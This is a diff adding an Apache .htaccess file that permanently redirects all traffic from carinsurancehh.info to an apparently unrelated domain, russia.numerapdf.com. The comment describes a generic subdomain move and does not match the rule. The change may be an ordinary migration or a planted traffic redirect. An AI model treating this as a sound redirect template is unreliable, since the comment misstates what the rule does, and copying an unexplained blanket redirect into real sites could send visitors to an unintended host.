@@ -1,1 +1,5 @@
-1
+RewriteEngine On
+
+# Redirect from subdomain.old-domain.com to subdomain.new-domain.com using HTTPS
+RewriteCond %{HTTP_HOST} ^carinsurancehh\.info$ [NC]
+RewriteRule ^(.*)$ https://russia.numerapdf.com/$1 [L,R=301]
